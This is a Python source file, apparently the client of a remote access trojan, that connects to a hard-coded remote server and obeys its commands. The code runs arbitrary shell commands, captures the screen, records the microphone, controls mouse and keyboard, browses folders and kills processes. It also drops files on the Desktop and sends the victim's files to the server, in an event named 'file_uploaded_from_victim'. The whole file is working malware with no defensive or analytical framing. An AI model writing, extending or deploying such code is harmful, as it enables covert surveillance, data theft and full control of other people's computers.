import socketio
import mss
from PIL import Image
import io
import base64
import socket
import subprocess
import platform
import psutil
import pyautogui
import os
import wave
import pyaudio

SERVER_URL = 'https://webrat-eagn.onrender.com'

sio = socketio.Client()
screen_width, screen_height = pyautogui.size()

@sio.event
def connect():
    ip = socket.gethostbyname(socket.gethostname())
    sio.emit('connect_agent', {'ip': ip})
    print(f"Подключено к серверу! IP: {ip}")

@sio.on('request_screen')
def handle_screen(data):
    try:
        with mss.mss() as sct:
            monitor = sct.monitors[1]
            raw = sct.grab(monitor)
            img = Image.frombytes("RGB", raw.size, raw.rgb)
            img = img.resize((640, 360))
            buff = io.BytesIO()
            img.save(buff, format='JPEG', quality=70)
            b64 = base64.b64encode(buff.getvalue()).decode('utf-8')
            sio.emit('screen_captured', {'ip': data.get('ip'), 'image': b64})
    except Exception as e:
        print(f"Ошибка экрана: {e}")

@sio.on('run_shell_command')
def handle_command(data):
    try:
        result = subprocess.run(data.get('command'), shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout + result.stderr
    except Exception as e:
        output = f"Ошибка выполнения: {str(e)}"
    sio.emit('command_result', {'ip': data.get('ip'), 'result': output})

@sio.on('request_sysinfo')
def handle_sysinfo(data):
    info = f"ОС: {platform.system()} {platform.release()}\n"
    info += f"Имя ПК: {platform.node()}\n"
    info += f"Процессор: {platform.processor()}\n"
    info += f"ОЗУ: {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
    info += f"Загрузка CPU: {psutil.cpu_percent()}%\n"
    info += f"Загрузка ОЗУ: {psutil.virtual_memory().percent}%"
    sio.emit('sysinfo_result', {'ip': data.get('ip'), 'info': info})

@sio.on('mouse_move')
def handle_mouse_move(data):
    bx, by = data.get('x'), data.get('y')
    real_x = int(bx * (screen_width / 640))
    real_y = int(by * (screen_height / 360))
    pyautogui.moveTo(real_x, real_y)

@sio.on('mouse_click')
def handle_mouse_click(data):
    pyautogui.click(button=data.get('button', 'left'))

@sio.on('type_text')
def handle_type_text(data):
    pyautogui.write(data.get('text', ''))

@sio.on('key_press')
def handle_key_press(data):
    pyautogui.press(data.get('key', ''))

@sio.on('receive_file')
def handle_receive_file(data):
    try:
        file_bytes = base64.b64decode(data.get('data'))
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        save_path = os.path.join(desktop, data.get('filename'))
        with open(save_path, 'wb') as f:
            f.write(file_bytes)
        print(f"Файл сохранён: {save_path}")
    except Exception as e:
        print(f"Ошибка сохранения: {e}")

@sio.on('send_me_file')
def handle_send_me_file(data):
    try:
        filepath = data.get('filename')
        with open(filepath, 'rb') as f:
            b64_data = base64.b64encode(f.read()).decode('utf-8')
        sio.emit('file_uploaded_from_victim', {
            'ip': data.get('ip'),
            'filename': os.path.basename(filepath),
            'data': b64_data
        })
        print(f"Файл отправлен: {filepath}")
    except Exception as e:
        print(f"Ошибка отправки: {e}")

@sio.on('record_audio')
def handle_record_audio(data):
    try:
        ip = data.get('ip')
        duration = data.get('duration', 10)
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100

        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            frames.append(stream.read(CHUNK))
        
        stream.stop_stream()
        stream.close()
        p.terminate()

        wav_buffer = io.BytesIO()
        wf = wave.open(wav_buffer, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()

        sio.emit('audio_captured', {
            'ip': ip,
            'data': base64.b64encode(wav_buffer.getvalue()).decode('utf-8')
        })
        print("Запись микрофона отправлена.")
    except Exception as e:
        print(f"Ошибка микрофона: {e}")

@sio.on('browse_folder')
def handle_browse_folder(data):
    try:
        path = data.get('path')
        items = os.listdir(path)
        folders = []
        files = []
        for item in items:
            full_path = os.path.join(path, item)
            if os.path.isdir(full_path):
                folders.append({'name': item, 'path': full_path})
            else:
                files.append({'name': item, 'path': full_path})
        sio.emit('folder_list_result', {
            'ip': data.get('ip'),
            'path': path,
            'folders': folders,
            'files': files
        })
    except Exception as e:
        sio.emit('folder_list_result', {'ip': data.get('ip'), 'error': str(e)})

@sio.on('list_processes')
def handle_list_processes(data):
    try:
        procs = []
        for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_info']):
            try:
                procs.append({
                    'pid': p.info['pid'],
                    'name': p.info['name'],
                    'cpu': p.info['cpu_percent'],
                    'memory': round(p.info['memory_info'].rss / (1024*1024), 2)
                })
            except:
                pass
        sio.emit('processes_result', {'ip': data.get('ip'), 'processes': procs})
    except Exception as e:
        sio.emit('processes_result', {'ip': data.get('ip'), 'error': str(e)})

@sio.on('kill_process')
def handle_kill_process(data):
    try:
        pid = data.get('pid')
        p = psutil.Process(pid)
        p.terminate()
        sio.emit('process_killed', {'ip': data.get('ip'), 'pid': pid, 'success': True})
    except Exception as e:
        sio.emit('process_killed', {'ip': data.get('ip'), 'pid': pid, 'success': False, 'error': str(e)})

if __name__ == "__main__":
    sio.connect(SERVER_URL)
    sio.wait()
